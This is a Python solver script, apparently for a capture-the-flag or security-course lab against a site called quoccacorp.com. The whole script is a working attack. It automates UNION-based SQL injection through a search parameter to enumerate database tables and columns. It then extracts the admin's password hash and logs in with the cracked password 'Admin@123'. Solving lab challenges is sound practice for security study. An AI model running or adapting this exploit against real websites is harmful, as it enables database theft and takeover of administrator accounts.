import sys
from pathlib import Path
sys.path.append(str(Path(__file__).resolve().parent.parent))
from utils import get_session, find_flag

from bs4 import BeautifulSoup

BASE_URL = "https://bigapp.quoccacorp.com"
ADMIN_EMAIL = "admin@quoccacorp.com"

class Solver:
    def __init__(self):
        self.session = get_session()

    def execute_payload(self, union_payload: str):
        response = self.session.get(BASE_URL, params={"q": union_payload})
        find_flag(response.text)
        soup = BeautifulSoup(response.text, "html.parser")
        last_column_values = []

        for td in soup.select("tr td:last-child"):
            last_col_value: str = td.text.strip()
            if not last_col_value.isdigit():
                last_column_values.append(last_col_value)

        return last_column_values

    def get_table_names(self) -> list[str]:
        return self.execute_payload("')) UNION SELECT 1, 2, 3, 4, 5, table_name, 7 FROM information_schema.tables; -- ")

    def get_column_names(self, table_name: str):
        return self.execute_payload(f"')) UNION SELECT 1, 2, 3, 4, 5, column_name, 7 FROM information_schema.columns WHERE table_name = '{table_name}'; -- ")

    def main(self):
        target_table_name = ""
        for table_name in self.get_table_names():
            for column_name in self.get_column_names(table_name):
                values = self.execute_payload(f"')) UNION SELECT 1, 2, 3, 4, 5, {column_name}, 7 FROM {table_name}; -- ")
                if ADMIN_EMAIL in values:
                    target_table_name, email_column_name = table_name, column_name
                    break
            if target_table_name: break

        print(f"Table Name: {target_table_name}\nColumns: {self.get_column_names(target_table_name)}")

        password_hash = self.execute_payload(f"')) UNION SELECT 1, 2, 3, 4, 5, password, 7 FROM {target_table_name} WHERE {email_column_name}='{ADMIN_EMAIL}'; -- ")[0]
        print(f"{password_hash = }") # 0e7517141fb53f21ee439b355b5a1d0a
        PASSWORD = "Admin@123"

        response = self.session.post(f"{BASE_URL}/login", data={"email": ADMIN_EMAIL, "password": PASSWORD})
        find_flag(response.text)

if __name__ == "__main__":
    Solver().main()